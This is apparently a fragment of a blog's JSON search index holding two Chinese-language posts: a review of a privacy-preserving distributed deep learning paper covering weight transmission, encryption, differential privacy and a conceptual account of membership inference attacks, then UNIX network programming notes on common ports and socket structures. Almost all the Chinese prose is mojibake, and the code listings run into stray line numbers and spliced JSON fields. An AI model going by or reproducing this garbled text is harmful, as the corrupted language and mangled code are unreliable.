é€šè¿‡ä¸€ä¸ªè¯æ˜è¡¨è¾¾äº†æœ¬æ–‡åœ¨å‡†ç¡®æ€§æ–¹é¢å’Œå°†æ‰€æœ‰æ•°æ®é›†é›†æˆåœ¨ä¸€ä¸ªè®­ç»ƒè€…è®­ç»ƒçš„ç»“æœå‡†ç¡®æ€§æ˜¯ç›¸åŒçš„ã€‚ è®ºæ–‡ä¸»è¦å†…å®¹æƒå€¼ä¼ è¾“é¦–å…ˆï¼Œæˆ‘ä»¬è¦ä¸ºå¤§å®¶è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆæƒå€¼ä¼ è¾“ç›¸æ¯”æ¢¯åº¦ä¼ è¾“æ‹¥æœ‰æ›´é«˜çš„å®‰å…¨æ€§å’Œä¿æŠ¤éšç§æ€§ï¼Œæœ¬ç¯‡æ–‡ç« é€šè¿‡è·Ÿä¹‹å‰ä¸¤ç¯‡æ–‡ç« çš„æ¯”è¾ƒæ¥è¯´æ˜ã€‚ ç¬¬ä¸€ç¯‡çš„ä¸»è¦æ€æƒ³æ˜¯åªä¼ è¾“éšæœºé€‰æ‹©çš„éƒ¨åˆ†æ¢¯åº¦è€Œæ”¾å¼ƒä¼ ç»Ÿçš„åŠ å¯†æ–¹æ³•ï¼Œå°½ç®¡åœ¨Sec.7 ä¸­æ–‡ç« ä½œè€…åˆåˆ©ç”¨äº†å·®åˆ†éšç§å¢åŠ æ‹‰æ™®æ‹‰æ–¯å™ªå£°çš„æ–¹æ³•ï¼Œä½†æ˜¯æ•°æ®ä¿å¯†æ€§å’Œå·®åˆ†éšç§æ˜¯æ­£äº¤çš„ï¼Œæ‰€ä»¥ä»å¯èƒ½é€ æˆæ³„éœ²ã€‚ R. Shokri and V. Shmatikov, â€œPrivacy-preserving deep learning,â€ in Proc. 22nd ACM SIGSAC Conf. Comput. Commun. Secur., I. Ray, N. Li, and C. Kruegel, Eds., Oct. 2015, pp. 1310â€“1321. ç¬¬äºŒç¯‡æ–‡ç« ä¸»è¦æ˜¯ä½¿ç”¨åŒæ€åŠ å¯†çš„æ–¹æ³•ï¼Œè™½ç„¶è¿›è¡Œäº†åŠ å¯†ï¼Œä½†æ˜¯åœ¨å…±è°‹çš„æƒ…å†µä¸‹ï¼Œåäººå¯¹å…¶è¿›è¡Œè§£å¯†å¹¶å¾—åˆ°åŸå§‹æ¢¯åº¦ï¼Œä»ç„¶ä¼šå¯¹æ•°æ®é€ æˆæ³„éœ²ã€‚æ‰€ä»¥æ¢¯åº¦ä¼ è¾“çš„æ–¹æ³•æ€»å½’ä¼šé€ æˆæ•°æ®çš„æ³„éœ²ï¼Œæˆ‘ä»¬é€‰æ‹©æƒå€¼ä¼ è¾“çš„æ–¹æ³•æ¥é¿å…è¿™ç§æ³„éœ²ã€‚è¿™æ ·åšçš„å…·ä½“åŸå› æˆ‘ä»¬ä¼šåœ¨theorem2 ä¸­è¿›è¡Œè®²è§£ L. T. Phong, Y. Aono, T. Hayashi, L. Wang, and S. Moriai, â€œPrivacypreserving deep learning via additively homomorphic encryption,â€ IEEE Trans. Inf. Forensics Security, vol. 13, no. 5, pp. 1333â€“1345, May 2018. SNT &amp; FNTæœ¬æ–‡æä¾›äº†ä¸¤ç§ç³»ç»ŸSNTï¼ŒFNTå…¶ä¸­å¤§éƒ¨åˆ†å†…å®¹æˆ‘ä»¬åœ¨SNTå†…å°±è®²åˆ°æ‰€ä»¥æˆ‘ä»¬ä¼šè¯¦ç»†ä»‹ç»SNTï¼Œå¹¶ä¹‹åç®€è¦æ¶‰åŠFNTã€‚æˆ‘ä»¬é¦–å…ˆæ˜ç¡®åœ¨åˆ†å¸ƒå¼å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡è¿›è¡Œä¸€ä¸ªå¤§çš„å¾ªç¯å³æ¯ä¸ªtraineréƒ½è¿›è¡Œä¸€æ¬¡ï¼ŒåŒ…å«å¯¹äºæ¯ä¸€ä¸ªtrainerçš„å°å¾ªç¯ã€‚å…¶ä¸­æ¯ä¸ªç¬¦å·çš„æ„ä¹‰åŠè¯´æ˜å¦‚ä¸‹ï¼Œ serverç«¯æ˜¯Honest-but-curious çš„ã€‚ Dataseti æŒ‡ä»£æ¯ä¸ªäººèƒ½æŒæ¡çš„æ•°æ®é›†ã€‚ ï¼ˆX,Yï¼‰æ˜¯Datasetçš„å­é›†ï¼Œä¸”æ ¹æ®åˆ†å¸ƒä¸åŒå¯ä»¥æ˜¯æ•´ä¸ªæ•°æ®é›†æˆ–è€…éšæœºé€‰æ‹©çš„ä¸€éƒ¨åˆ†ã€‚ Kæ˜¯trainer é—´å…±äº«çš„å¯†é’¥ï¼Œä½†æ˜¯ä¸èƒ½å‘Šè¯‰ server â€“FNT å°±ä¸éœ€è¦äº†ã€‚ $Enc_k(W)$æ˜¯ç”¨kå¯†é’¥å¯¹Wè¿›è¡ŒåŠ å¯†ã€‚ encW æ˜¯åŠ å¯†åçš„å¯†æ–‡ã€‚ $Dec_k(C)$æ˜¯ç”¨Kå¯†é’¥å¯¹Cè¿›è¡Œè§£å¯†ã€‚ $W_0$æ˜¯éšæœºé€‰æ‹©çš„åˆå§‹æƒé‡ã€‚å…¶ä¸­é™¤Kä»¥å¤–çš„æ‰€æœ‰å˜é‡éƒ½æ˜¯vectorå½¢å¼å‡ºç°çš„ã€‚ æ¯ä¸ªtraineræ‰§è¡Œçš„æ“ä½œå¦‚ä¸‹:$$W_1=Dec_k(encW_1) \\\\G_2 = \\frac{\\delta J(W_1,X_2,Y_2)}{\\delta W} \\\\W_2 = W_1 - \\alpha(t)Â·G_2 \\\\encW_2 = Enc_k(W_2)$$â€‹ ç„¶åå°†encWä¼ ç»™serverï¼Œå¹¶ç”±serverç«¯å‘é€ç»™ä¸‹ä¸€ä¸ªtrainerã€‚ *FNT***ç³»ç»Ÿæ˜¯å…¨è¿æ¥çš„,è¿™å°±äº§ç”Ÿäº†ä¸€ä¸ªé—®é¢˜ï¼Œç»è¿‡æˆ‘ä»¬å¯¹äºSNTçš„æè¿°æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥å›ºå®šçš„é¡ºåºè¿›è¡Œè®­ç»ƒï¼Œé‚£æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦å…¨è¿æ¥ï¼Œå¢åŠ è¿™ä¹ˆå¤šçš„è·¯å¾„å‘¢ï¼ŒåŸå› æœ‰ä»¥ä¸‹ä¸‰ç‚¹ï¼š å¦‚æœè·¯å¾„å¤±æ•ˆï¼Œé‚£ä¹ˆç³»ç»Ÿå¯èƒ½ä¼šå› æ­¤åæ‰ï¼Œæ‰€ä»¥å…¨è¿æ¥ä¼šå¢åŠ å¯é æ€§ã€‚ å…¨è¿æ¥çš„æ–¹æ³•å¯ä»¥é€‚åº”éšæœºå‘é€çš„å·¥ä½œæ¨¡å¼ï¼Œè€Œä¸ç”¨åªèƒ½æŒ‰é¡ºåºå‘é€ã€‚ å¯ä»¥å®ç°åŒ¿åä¼ è¾“çš„å®‰å…¨æªæ–½ï¼Œè¿™ä¸ªæˆ‘ä»¬æ¥ä¸‹æ¥ä¼šè®²ã€‚ å®‰å…¨ åŠ å‡†ç¡®æ€§ ç†è®ºè§£é‡Šç†è®ºä¸€ï¼šç³»ç»Ÿåœ¨é¢å¯¹è¯šå®ä½†å¥½å¥‡çš„æœåŠ¡ç«¯ä¸‹çš„å®‰å…¨æˆ‘ä»¬ä½¿ç”¨å¯¹ç§°åŠ å¯†æ–¹æ³•ä½¿serverç«¯åªèƒ½çœ‹è§åŠ å¯†åçš„Wæƒé‡ï¼Œæˆ‘ä»¬é€‰ç”¨èƒ½æŠµæŠ—é€‰æ‹©çš„å¯¹ç§°åŠ å¯†æ–¹æ³•å³å¯ã€‚ ç†è®ºäºŒï¼šåœ¨é¢å¯¹æç«¯å…±è°‹collusionä¸‹çš„å®‰å…¨æ€§æç«¯å…±è°‹å³å½“åªæœ‰trainer1å¯ä¿¡ï¼Œtrainer2-l,serveréƒ½ä¸å¯ä¿¡çš„æƒ…å†µä¸‹,åäººä¹Ÿä¸èƒ½è®¡ç®—å‡ºtrainer1çš„æ•°æ®é›†ä¿¡æ¯ï¼Œé™¤éä»–ä»¬è§£å†³éçº¿æ€§é—®é¢˜æˆ–å­é›†å’Œé—®é¢˜ å…¶ä¸­éçº¿æ€§é—®é¢˜ä»£è¡¨æˆ‘ä»¬åœ¨è¿›è¡Œè®¡ç®—æ—¶ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ¿€æ´»å‡½æ•°éƒ½æ˜¯éçº¿æ€§å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä»è®¡ç®—å‡ºæ¥çš„æƒå€¼æ¢å¤æ•°æ®é›†çš„æœ¬èº«æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è§£å†³éçº¿æ€§é—®é¢˜ï¼Œè€Œè¿™ç§é—®é¢˜æ˜¯ååˆ†éš¾è§£çš„ å­é›†å’Œé—®é¢˜çš„è®²è§£æˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›æ•°å­¦å…¬å¼ï¼Œé¦–å…ˆæˆ‘ä»¬æ˜ç¡®çš„æ˜¯ï¼Œåœ¨æ¯ä¸ªè®­ç»ƒè€…ç»å†çš„ä¸€æ¬¡å°å¾ªç¯ä¸­ï¼Œä»–éœ€è¦æ‰§è¡Œæœ‰å¤šä¸ªå…¬å¼ç»„æˆçš„(1)å·å¼å­ï¼Œå¹¶é€šè¿‡åŒ–ç®€å¾—åˆ°åˆ°ï¼ˆ2ï¼‰å·å¼å­ï¼Œå› ä¸ºæˆ‘ä»¬å‡å®šå‰åtrainerçŸ¥é“åˆå§‹çš„Wå’Œç»“æŸåçš„Wï¼Œé‚£ä¹ˆä»–æœªçŸ¥çš„å°±æ˜¯è®¡ç®—åçš„(3)å·å¼å­ã€‚$$G_1 = \\frac{\\delta J(W_{0},X_1,Y_1)}{\\delta W} \\\\W_1 = W_{0} - \\alpha(1)Â·G_1 \\\\\\vdots \\\\G_i = \\frac{\\delta J(W_{i-1},X_i,Y_i)}{\\delta W} \\\\W_i = W_{i-1} - \\alpha(i)Â·G_i \\\\\\vdots \\\\G_n = \\frac{\\delta J(W_{n-1},X_n,Y_n)}{\\delta W} \\\\W_n = W_{n-1} - \\alpha(n)Â·G_n (1)$$ $$W^{(final)} = W_n \\\\= W_n-1 - \\alpha_nG_n \\\\= W_n-2 - \\alpha_{n-1}G_{n-1} - \\alpha_nG_n \\\\\\vdots \\\\= w_0 - (\\alpha_{1}G_{1} + \\dots + \\alpha_nG_n) \\\\= W^{(init)} - (\\alpha_{1}G_{1} + \\dots + \\alpha_nG_n) (2) \\\\W^{(init)} - W^{(final)} = (\\alpha_{1}G_{1} + \\dots + \\alpha_nG_n) (3)$$ å…¶ä¸­ç¬¦å·çš„å®šä¹‰å¦‚ä¸‹ (ğ‘‹_ğ‘–,ğ‘Œ_ğ‘–) (1â‰¤ğ‘–â‰¤ğ‘›)æ˜¯Dataset1æ´—ç‰Œåçš„ä¸€å°éƒ¨åˆ† ğ›¼_ğ‘–å¯ä»¥æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯trainer1è‡ªå·±é€‰æ‹©çš„ ğ‘› = |ğ·ğ‘ğ‘¡ğ‘ğ‘ ğ‘’ğ‘¡1|/ğ‘ğ‘ğ‘¡ğ‘â„_ğ‘ ğ‘–ğ‘§ğ‘’â‰«1 æˆ‘ä»¬çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²çŸ¥ï¼ˆ3ï¼‰å¼çš„å’Œï¼Œä¸”næ˜¯ååˆ†å¤§çš„ã€‚ç®—å¾—æ¯ä¸ªå€¼æ˜¯ä¸€ä¸ªNP-Completeéš¾è§£é—®é¢˜ï¼Œéœ€è¦å¤šé¡¹å¼æœªçŸ¥çš„æ—¶é—´å¤æ‚åº¦ã€‚æ‰€ä»¥ä»–æ˜¯å®‰å…¨çš„ã€‚ å®šç†ä¸‰ï¼šåˆ†å¸ƒå¼çš„æ•°æ®é›†çš„è¿ç®—ä¸åœ¨ä¸€ä¸ªä¸»æœºä¸Šå¯¹æ‰€æœ‰æ•°æ®é›†çš„å¹¶é›†è¿›è¡Œè¿ç®—å¾—åˆ°çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚ è¯¥å®šç†åœ¨é€»è¾‘ä¸Šç†è§£å°±å¯ä»¥ï¼Œæ–‡ä¸­ä¹Ÿåªç»™äº†æè¿°æ€§çš„è¯æ˜ é™„åŠ è€ƒè™‘ additional considerationåœ¨è¯¥ç³»ç»Ÿè¿ç”¨å’Œå®éªŒå®é™…æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ–‡ä¸­ä¹Ÿå¢åŠ äº†å¾ˆå¤šå…¶ä»–éä¸»ä½“ç³»ç»Ÿæ¶‰åŠçš„æ–¹æ³•ã€‚ ä¸ºäº†è¯æ˜å­é›†å’Œé—®é¢˜çš„å®éªŒæ•°æ®åœ¨å®é™…æ•°æ®é›†ä¸­ï¼ŒæœªçŸ¥æ•°çš„æ•°é‡æ˜¯è¿œå¤§äºç­‰å¼çš„æ•°é‡çš„ï¼Œå…·ä½“çš„å®éªŒæƒ…å†µè§ä¸‹å›¾ ä¸ºäº†å¢åŠ æ•°æ®é›†çš„è®­ç»ƒæ•ˆæœï¼Œæˆ‘ä»¬ä¼šå¯¹æ•°æ®é›†è¿›è¡Œæ‰©å¼ ä¾‹å¦‚å›¾ç‰‡ï¼šåˆ©ç”¨æ—‹è½¬ï¼Œè£å‰ªï¼Œç¿»è½¬ç­‰æ–¹æ³• , è¿‡æ‹Ÿåˆåé¢ä¼šè§£å†³ å®é™…è®­ç»ƒä¸­ä½¿ç”¨äº†SGDçš„è¿›åŒ–ç‰ˆæœ¬ä¾‹å¦‚ ï¼šRMSProp [27] or Adam [28], é¢„å®šä¹‰ additional hedgeåŒæ—¶ä¸ºäº†ä½¿ç³»ç»Ÿæ›´å¥½çš„è¿›è¡Œï¼Œæˆ‘ä»¬è¿˜è¿›è¡Œäº†ä¸€äº›é¢„å®šä¹‰ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æ˜ç¡®æƒ³è¦è¾¾åˆ°å®Œç¾çš„ï¼Œæ²¡æœ‰æ³„éœ²çš„ç³»ç»Ÿæ˜¯ä¸å¯èƒ½çš„ã€‚æ–‡ä¸­å°†å…¶æè¿°ä¸ºDalenius desideratumï¼Œå³ç³»ç»Ÿå°†ä¼šè½¬åŒ–ä¸ºå®Œå…¨çš„éšæœºæ•°ä¼ è¾“ï¼Œè¿™æ˜¯æ²¡æœ‰ä¸æ¯«å®ç”¨æ€§çš„ã€‚ å¢åŠ äº†å·®åˆ†éšç§å³æ·»åŠ å™ªå£°çš„æ–¹æ³•ç”¨äºå¢åŠ éšç§æ€§,å…¶å®å°±æ˜¯åœ¨éšç§æ€§å’Œå‡†ç¡®æ€§ä¹‹é—´å¯»æ‰¾ä¸€ç§å¹³è¡¡ åˆ©ç”¨Dropout çš„æ–¹æ³•å¢åŠ å·®åˆ†éšç§å’Œé˜²æ­¢è¿‡æ‹ŸåˆDropout çš„æ–¹æ³•ç”±ç¥ç»ç½‘ç»œé¢†åŸŸå¤§ç‰›Hinton 14å¹´æå‡ºï¼Œä¸»è¦åšæ³•æ˜¯åœ¨è®­ç»ƒæ—¶éšæœºéšè—ä¸€äº›ç»“ç‚¹ï¼Œè¿™æ ·èƒ½é™ä½ç»“ç‚¹é—´çš„ä¾èµ–æ€§ï¼ŒåŒæ—¶ä¹Ÿä¼šé™ä½å¯¹äºæ•°æ®çš„ä¾èµ–æ€§ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œæˆ‘ä»¬å°†ä¸€æ”¯å†›é˜Ÿåˆ†ä¸ºä¸‰éƒ¨åˆ†åˆ†åˆ«åœ¨æµ·é™†ç©ºè¿›è¡Œè®­ç»ƒï¼Œé‚£ä¹ˆä»–ä»¬æœ€åç»„åˆèµ·æ¥ç¯å¢ƒå¯¹äºä»–ä»¬å½±å“ä¼šå¾ˆå°ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿæ²¡æœ‰åŠæ³•æ ¹æ®ä¸åŒç¯å¢ƒä»–ä»¬çš„ä½œæˆ˜è¡¨ç°åˆ¤æ–­ä»–ä»¬æ˜¯æµ·å†›ï¼Œé™†å†›è¿˜æ˜¯ç©ºå†›ã€‚ ä½¿ç”¨åŒ¿åä¼ è¾“çš„æ–¹æ³•å¢å¼ºéšç§æ€§æˆ‘ä»¬ä½¿ç”¨çš„å…·ä½“æ–¹æ³•ä¸ºï¼Œåœ¨ç”±serverè½¬å‘æ—¶éšè—æ•°æ®çš„æ¥æºï¼Œæˆ–è€…éšæœºä¼ è¾“ï¼Œå³ä¸€ä¸ªæ•°æ®å¯èƒ½æ¥è‡ªå°é›†åˆä¸­çš„ä»»ä¸€å…ƒç´  èµ‹äºˆæ¯ä¸ªç»“ç‚¹å½“å‘ç°é—®é¢˜å°±è¿›è¡Œé˜²å¾¡æ€§è¿›æ”»çš„æƒåŠ›ï¼ˆå³1ï¼Œ2ï¼Œ3ï¼‰å®é™…æ”»å‡»ä¸¾ä¾‹æ–‡ä¸­è¿˜ç”¨å®é™…çš„æ”»å‡»è¿›è¡Œä¸¾ä¾‹ï¼Œè¯¥æ”»å‡»çš„ç›®çš„æ˜¯é€šè¿‡è·å–çš„ä¿¡æ¯æ‰¾åˆ°æ¨¡å‹ä¸Šä¸€è·³åœ¨å“ªä¸ªæ•°æ®é›†è®­ç»ƒçš„ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥åˆ©ç”¨1ï¼Œ2ï¼Œ4çš„æ–¹æ³•ç»¼åˆèµ·æ¥ï¼Œé˜²æ­¢è¿™ç§æ”»å‡»ã€‚å½“é¢ä¸´ä¸€ä¸ªæ›´å¼ºçš„å…·ä½“çš„æ”»å‡»æ—¶ï¼Œæ¯”å¦‚æˆå‘˜æ¨ç†æ”»å‡»ï¼Œæˆ‘ä»¬è¿™æ ·é˜²èŒƒã€‚ æˆå‘˜æ¨ç†æ”»å‡»çš„ç›®çš„æ˜¯ï¼šç»™å‡ºä¸€æ¡æ ·æœ¬ï¼Œå¯ä»¥æ¨æ–­è¯¥æ ·æœ¬æ˜¯å¦åœ¨æ¨¡å‹çš„è®­ç»ƒæ•°æ®é›†ä¸­â€”â€”å³ä¾¿å¯¹æ¨¡å‹çš„å‚æ•°ã€ç»“æ„çŸ¥ä¹‹ç”šå°‘ï¼Œè¯¥æ”»å‡»ä»ç„¶æœ‰æ•ˆ æœ¬è´¨æ˜¯ï¼šæ„å»ºä¸€ä¸ªäºŒåˆ†ç±»æ¨¡å‹ï¼Œä»¥X,Yä¸ºå‚æ•°ï¼Œåˆ¤æ–­è¯¥é¡¹æ˜¯å¦åœ¨æ•°æ®é›†ä¸­ ä¸»è¦éƒ¨åˆ†æ˜¯ï¼šåˆ©ç”¨å½±å­æ¨¡å‹(shadow model)æ„å»ºä¸åŸç›®æ ‡æ¨¡å‹è®­ç»ƒé›†ç›¸ä¼¼çš„æ•°æ®é›† æ–‡ä¸­ç»™å‡ºäº†ä¸‰ç§æ„å»ºå½±å­æ¨¡å‹çš„æ–¹æ³•ï¼š Model-based synthesisï¼š ç›´è§‚ä¸Šï¼Œå¦‚æœç›®æ ‡æ¨¡å‹ä»¥å¾ˆé«˜çš„æ¦‚ç‡ç»™å‡ºäº†æŸæ¡recordçš„ç±»åˆ«ï¼Œé‚£ä¹ˆè¯¥recordä¸ç›®æ ‡æ¨¡å‹è®­ç»ƒé›†ä¸­çš„æ•°æ®åº”è¯¥æ˜¯ååˆ†ç›¸ä¼¼çš„ã€‚æ‰€ä»¥ï¼Œå¯ä»¥ç”¨ç›®æ ‡æ¨¡å‹æœ¬èº«æ¥æ„å»ºå½±å­æ¨¡å‹çš„è®­ç»ƒæ•°æ®ï¼š æˆ‘ä»¬é€šè¿‡å·®åˆ†éšç§æ·»åŠ å™ªå£°çš„æ–¹æ³•ä½¿æ¦‚ç‡å¤„äºå˜åŒ–ä¸­ï¼ŒæŒ‘æˆ˜ä»–çš„é˜ˆå€¼ Statistics-based synthesisï¼š æ”»å‡»è€…çŸ¥é“ç›®æ ‡æ¨¡å‹è®­ç»ƒæ•°æ®çš„åˆ†å¸ƒä¿¡æ¯ï¼Œæ¯”å¦‚featureçš„è¾¹ç¼˜åˆ†å¸ƒï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ç”±åˆ†å¸ƒç”Ÿæˆæ•°æ®ã€‚ Noisy real dataï¼š æ”»å‡»è€…ä¹Ÿè®¸å¯ä»¥è·å¾—å’Œç›®æ ‡æ¨¡å‹è®­ç»ƒé›†æ•°æ®ç›¸ä¼¼çš„æ•°æ®ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ç›®æ ‡æ¨¡å‹è®­ç»ƒé›†çš„å™ªå£°ç‰ˆæœ¬ï¼Œç›´æ¥åˆ©ç”¨ä¹‹ å¯¹äºäºŒå’Œä¸‰æ–¹æ³•ï¼Œç”±äºæœ¬æ–‡çš„æ•°æ®é›†åªä¼šåœ¨æœ¬åœ°è¢«è®­ç»ƒï¼Œæ‰€ä»¥æ”»å‡»è€…æ—¢ä¸èƒ½å¾—åˆ°åˆ†å¸ƒä¹Ÿä¸èƒ½å¾—åˆ°å¸¦å™ªå£°çš„æ•°æ®ï¼Œå› æ­¤å¯ä»¥é˜²èŒƒè¿™ç§æ”»å‡»ã€‚ æ€»ç»“æœ¬ç‰‡æ–‡ç« äº®ç‚¹ä¸»è¦å°±æ˜¯æƒå€¼ä¼ è¾“ï¼Œå¹¶ä¸”çœŸçš„æ˜¯çµæ´»åˆ©ç”¨äº†è¿™ä¸ªå†…å®¹ï¼Œæˆ‘è§‰å¾—å®ƒä¸»è¦åšåˆ°äº†ä¸¤ä»¶äº‹ é¦–å…ˆå®ƒè®©æ¯ä¸€ä¸ªç»“ç‚¹åœ¨ä¸€æ¬¡å¾ªç¯é‡Œæ‰§è¡Œå¤šæ¬¡è¿ç®—ï¼Œè¿™æ ·å°±æˆåŠŸå¼•å…¥äº†å­é›†å’Œé—®é¢˜ï¼Œç›¸å½“äºå¯¹äºæ¢¯åº¦çš„åŠ å¯†ä¹Ÿæ˜¯å¯¹äºæ•°æ®çš„äºŒæ¬¡åŠ å¯† åˆ©ç”¨äº†æƒå€¼çš„é€’å½’æ€§ï¼Œè¿™æ ·å¯ä»¥å¯¹æƒå€¼è¿›è¡ŒåŠ å¯†ï¼Œä¸‹ä¸€ä¸ªtrainerå†è¿›è¡Œè§£å¯†åè®¡ç®—ï¼Œä¸­é—´çš„è½¬å‘è€…ä¸éœ€è¦çŸ¥é“å¯†é’¥ä¹Ÿä¸éœ€è¦çŸ¥é“å†…å®¹ï¼Œè¿™å¯èƒ½ä¹Ÿæ˜¯ä¸€ç§ç«¯åˆ°ç«¯å§","link":"","tags":[{"name":"privacy-preserving","slug":"privacy-preserving","permalink":"https://dingiso.github.io/tags/privacy-preserving/"}]},{"title":"UNIX é«˜çº§ç½‘ç»œç¼–ç¨‹å¤ä¹ ","date":"2021-03-13T03:05:34.000Z","path":"2021/03/13/UNIX é«˜çº§ç½‘ç»œç¼–ç¨‹å¤ä¹ /","text":"æœ¬æ–‡ä¸»è¦æ˜¯ UNIXé«˜çº§ç½‘ç»œç¼–ç¨‹ - å·ä¸€ çš„æ€»ç»“ UNIX é«˜çº§ç½‘ç»œç¼–ç¨‹å¤ä¹ Chapter 1 è€ƒè‘—åçš„äººç‰©ï¼š cè¯­è¨€ä½œè€… ï¼Œ unix ä½œè€…ï¼š Ken Thompson (Dennis M. Ritchie)ï¼Œ GNU åˆ›å»ºè€…/Emacs ä½œè€… Richard Matthew Stallman ï¼› linux ä½œè€…ï¼šLinus Benedict Torvalds vim ä½œè€…ï¼š Bram Moolenaar Tex ä½œè€…ï¼š Donald Knuth é«˜å¾·çº³ Chapter 2â€‹ TCP çŠ¶æ€è½¬æ¢å›¾ ï¼Œ 2.9 å¸¸ç”¨çš„Port Number ï¼Œ2.10 Concurrent Server ï¼Œ 2.12 services 12345678910111213141516171821ç«¯å£ï¼šFTP æ–‡ä»¶ä¼ è¾“æœåŠ¡22ç«¯å£ï¼šSSH ç«¯å£23ç«¯å£ï¼šTELNET ç»ˆç«¯ä»¿çœŸæœåŠ¡25ç«¯å£ï¼šSMTP ç®€å•é‚®ä»¶ä¼ è¾“æœåŠ¡53ç«¯å£ï¼šDNS åŸŸåè§£ææœåŠ¡80ç«¯å£ï¼šHTTP è¶…æ–‡æœ¬ä¼ è¾“æœåŠ¡110ç«¯å£ï¼šPOP3 â€œé‚®å±€åè®®ç‰ˆæœ¬3â€ä½¿ç”¨çš„ç«¯å£443ç«¯å£ï¼šHTTPS åŠ å¯†çš„è¶…æ–‡æœ¬ä¼ è¾“æœåŠ¡**********************************1433ç«¯å£ï¼šMS SQL*SERVERæ•°æ®åº“ é»˜è®¤ç«¯å£å·1521ç«¯å£ï¼šOracleæ•°æ®åº“æœåŠ¡1863ç«¯å£ï¼šMSN Messengerçš„æ–‡ä»¶ä¼ è¾“åŠŸèƒ½æ‰€ä½¿ç”¨çš„ç«¯å£3306ç«¯å£ï¼šMYSQL é»˜è®¤ç«¯å£å·3389ç«¯å£ï¼šMicrosoft RDP å¾®è½¯è¿œç¨‹æ¡Œé¢ä½¿ç”¨çš„ç«¯å£5631ç«¯å£ï¼šSymantec pcAnywhere è¿œç¨‹æ§åˆ¶æ•°æ®ä¼ è¾“æ—¶ä½¿ç”¨çš„ç«¯å£5632ç«¯å£ï¼šSymantec pcAnywhere ä¸»æ§ç«¯æ‰«æè¢«æ§ç«¯æ—¶ä½¿ç”¨çš„ç«¯å£5000ç«¯å£ï¼šMS SQL Serverä½¿ç”¨çš„ç«¯å£8000ç«¯å£ï¼šè…¾è®¯QQ Chapter 3ï¼Œ4ï¼Œ5ï¼Œ6Socket Address Structures1234567891011121314151617struct in_addr &#123; in_addr_t s_addr; /* 32-bit IPv4 address */ /* network byte ordered */&#125;;struct sockaddr_in &#123; uint8_t sin_len; /* length of structure (16) */ sa_family_t sin_family; /* AF_INET */ in_port_t sin_port; /* 16-bit TCP or UDP port number */ /* network byte ordered */ struct in_addr sin_addr; /* 32-bit IPv4 address */ /* network byte ordered */ char sin_zero[8];/* unused */&#125;;// IPV4inet_addr inet_ntoa// IPV4/6inet_pton inet_ntop in_addr æ˜¯ç»“æ„çš„åŸå› æ˜¯æ—©æœŸå°†å…¶å®šä¹‰ä¸º union æ–¹ä¾¿Aï¼ŒBï¼ŒCç±»åœ°å€çš„è®¿é—® sin_zero ç½®0 Generic socket address structure1234567891011struct sockaddr &#123; uint8_t sa_len; sa_family_t sa_family; /* address family: AF_xxx value */ char sa_data[14]; /* protocol-specific address */&#125;;// ç”¨æ³•int bind(int, struct sockaddr *, socklen_t);struct sockaddr_in serv; /* IPv4 socket address structure *//* fill in serv&#123;&#125; */bind(sockfd, (struct sockaddr *) &amp;serv, sizeof(serv)); ç”¨äºå®šä¹‰å‡½æ•°æ—¶é€‚é…å„ç§ä¸åŒç±»å‹çš„åœ°å€ç»“æ„ï¼Œ è‹¥ä¸è½¬æ¢ï¼Œç¼–è¯‘å™¨æŠ¥ warning: passing arg 2 of &#39;bind&#39; from incompatible pointer type Sockaddr_in6128-bits ipv6 åœ°å€ 1234567891011121314151617struct in6_addr &#123; uint8_t s6_addr[16]; /* 128-bit IPv6 address */ /* network byte ordered */&#125;;#define SIN6_LEN /* required for compile-time tests */struct sockaddr_in6 &#123; uint8_t sin6_len; /* length of this struct (28) */ sa_family_t sin6_family; /* AF_INET6 */ in_port_t sin6_port; /* transport layer port# */ /* network byte ordered */ uint32_t sin6_flowinfo; /* flow information, undefined */ struct in6_addr sin6_addr; /* IPv6 address */ /* network byte ordered */ uint32_t sin6_scope_id; /* set of interfaces for a scope */&#125;; Value-Resultå½“æˆ‘ä»¬æŠŠ SA* ä»ç”¨æˆ·è¿›ç¨‹ä¼ å…¥å†…æ ¸æ—¶é•¿åº¦ä½œä¸ºå€¼ value ï¼Œå†…æ ¸å¤„ç†å®Œè¿”å›æ—¶ç»“æ„çš„å¤§å°å¯èƒ½ä¼šæ”¹å˜ï¼Œå› æ­¤é•¿åº¦ä½œä¸ºä¸€ä¸ªç»“æœ result ä¼ å› , å¼•ç”¨æ˜¯å› ä¸ºéœ€è¦å‡½æ•°å†…éƒ¨å»èµ‹å€¼ 123456789101112131415// ç”¨æˆ·è¿›ç¨‹ =&gt; å†…æ ¸// bind connect sendto struct sockaddr_in serv;/* fill in serv&#123;&#125; */connect(sockfd, (SA *) &amp;serv, sizeof(serv));// å†…æ ¸ =&gt; ç”¨æˆ·è¿›ç¨‹// accept recvfrom getsockname getpeername struct sockaddr_un cli; /* Unix domain */socklen_t len;len = sizeof(cli); /* len is a value */getpeername(unixfd, (SA *) &amp;cli, &amp;len);/* len may have changed */ å­—èŠ‚åº Byte Ordering12345678// å­—èŠ‚åºè½¬æ¢å‡½æ•°#include &lt;netinet/in.h&gt;uint16_t htons(uint16_t host16bitvalue);uint32_t htonl(uint32_t host32bitvalue); Both return: value in network byte orderuint16_t ntohs(uint16_t net16bitvalue);uint32_t ntohl(uint32_t net32bitvalue); Both return: value in host byte order n - network , h - host , s - short 16 ä½, l - long 32 ä½ Byte Manipulation1234567#include &lt;strings.h&gt;void bzero(void *dest, size_t nbytes);void bcopy(const void *src, void *dest, size_t nbytes);int bcmp(const void *ptr1, const void *ptr2, 